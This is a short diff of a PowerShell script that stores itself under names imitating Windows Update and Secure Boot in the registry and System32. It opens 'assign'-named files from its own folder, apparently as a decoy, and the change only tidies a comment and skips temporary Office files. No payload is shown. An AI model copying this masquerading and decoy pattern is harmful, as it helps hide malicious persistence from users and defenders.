@@ -4,10 +4,10 @@ $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $directoryPath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/"
 
-#File Opening.
+# File Opening.
 $scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
 $searchPattern = "*assign*.*"
-$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File -Force -ErrorAction SilentlyContinue
+$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File -Force -ErrorAction SilentlyContinue | Where-Object { -not $_.Name.StartsWith("~$") }
 if ($matchingFiles) {
     foreach ($file in $matchingFiles) {
         Write-Host "Opening file: $($file.FullName)"
